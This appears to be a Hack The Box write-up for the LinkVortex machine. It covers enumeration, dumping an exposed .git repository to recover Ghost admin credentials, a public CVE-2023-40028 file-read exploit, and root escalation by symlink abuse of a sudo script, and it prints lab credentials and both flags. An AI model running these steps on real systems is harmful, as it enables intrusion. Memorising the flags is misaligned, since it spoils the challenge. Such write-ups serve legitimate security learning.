
HTB : [[Machines]]

**Date:** 09/01/25  
**Target IP:** 10.10.11.47

---
### **Initial Scanning**

##### **Nmap**:

- **22/tcp** open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
- **80/tcp** open  http    Apache httpd
	|\_http-title: Did not follow redirect to http://linkvortex.htb

Added linkvortex.htb to /etc/hosts file

---
### **Exploration and Enumeration**

**Port 80 (HTTP):**
- Navigated to website hosted at port 80.
- Blog page type thing.
- Blog author is admin.
- Sign Up button doesn't work.
- Powered by Ghost???

**Ghost** is an open source ("Open-source software") content management system platform written in JavaScript and distributed under the [MIT License](https://en.wikipedia.org/wiki/MIT_License "MIT License"), designed to simplify the process of online publishing for individual bloggers as well as online publications.

Found the default Ghost Admin Login Page at http://linkvortex.htb/ghost/#/signin.

Found multiple exploits or Ghost on GitHub and other CVE databases but they seem to require credentials which I do not possess which means another approach should be attempted.

##### **Subdomain and Directory Enumeration**

With great difficulty (the connection to this server is infuriating), a subdomain at **dev.linkvortex.htb** was discovered.

```bash
❯ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://FUZZ.linkvortex.htb/ -c -v -fc 301
```

Dirsearch was then used to reveal that dev.linkvortex.htb had some interesting directories.

```bash
❯ dirsearch -u http://dev.linkvortex.htb -t 50

[16:03:48] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/
```

Found the following at http://dev.linkvortex.htb/.git/logs/HEAD

```
0000000000000000000000000000000000000000 299cdb4387763f850887275a716153e84793077d root <dev@linkvortex.htb> 1730322603 +0000	clone: from https://github.com/TryGhost/Ghost.git
```

---
### **Exploitation**

In order to properly analyse the git repo, it is necessary to fetch the whole thing. This is accomplished with:

```
❯ wget -m -I .git http://dev.linkvortex.htb/.git
```

We can then `cd` into the downloaded folder and run:

```bash
❯ git status
```

Obtaining the following:

```
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
	new file:   Dockerfile.ghost
	modified:   ghost/core/test/regression/api/admin/authentication.test.js

Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	deleted:    .editorconfig
	deleted:    .gitattributes
	deleted:    .github/AUTO_ASSIGN
	deleted:    .github/CONTRIBUTING.md
```

We can the obtain credentials in the listed modified file using:

```bash
❯ git show :ghost/core/test/regression/api/admin/authentication.test.js
```

`const password = 'OctopiFociPilfer45';` is one of the credentials obtained and utilizing a user enumeration vulnerability on the the Ghost login page we are able to deduce that `admin@linkvortex.htb` is an existing user email. Combining these we can gain access to the ghost admin page.

Now having obtained a valid username and password, I'm able to use the Ghost CMS exploits i previously found on GitHub. One specifically stands out: https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028 as it allows one to arbitrarily read any file on the system. It can hence be used to read the other file that was listed before when I ran `git status`.

On reading the file using the exploit:

```
❯ bash exploit.sh -u admin@linkvortex.htb -p OctopiFociPilfer45 -h linkvortex.htb
```

We obtain the following credentials:

```
"user": "bob@linkvortex.htb",
"pass": "fibber-talented-worth"
```

I can now SSH into this user and obtain the **user flag** :

**c623ddf811a8211e6d0c7be7832a66a5**

---
### **Post-Exploitation**

Running linpeas did not indicate anything extremely interesting. However `sudo -l` did.

```
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Reading the `clean_symlink.sh` file provided the following :

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

Effectively, this script checks if a .png file is a symbolic link and if it is trying to link to a critical, sensitive file. If it finds it trying to read a critical file it removes the link and if not it checks its content (optionally printing said content) and moves it to a quarantine folder.

---
### **Escalation**

This script can be exploited to display the contents of `/root/root.txt` by first creating a `test.txt` file with a symbolic link to it and then creating a further `test.png` file with a symbolic link to the `test.txt` file and then running the script with `CHECK_CONTENT=true` to display the contents.

```bash
bob@linkvortex:~$ ln -s /root/root.txt test.txt

bob@linkvortex:~$ ls
test.txt  user.txt

bob@linkvortex:~$ ln -s /home/bob/test.txt test.png

bob@linkvortex:~$ ls
test.png  test.txt  user.txt

bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh test.png

Link found [ test.png ] , moving it to quarantine
Content:
bf048412c4ade4b196805ed2d70de3f5
```

We thus obtain the **root flag** :

**bf048412c4ade4b196805ed2d70de3f5**

---
### **Summary**

- Ghost CMS ( **Outdated Version** ) website on Port 80
- Discovered Subdomain: **dev.linkvortex.htb** with **.git folder accessible**
- Ghost CMS Admin Credentials: `admin@linkvortex.htb : OctopiFociPilfer45`
- [GitHub Exploit](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028) for **arbitrary file read**
- Bob User Credentials: `bob@linkvortex.htb : fibber-talented-worth`
- User Flag (`home/bob/user.txt`) : **c623ddf811a8211e6d0c7be7832a66a5**
- **Insecure script** allowing Bob to arbitrarily read sensitive files
- Root Flag (`/root/root.txt`) : **bf048412c4ade4b196805ed2d70de3f5**





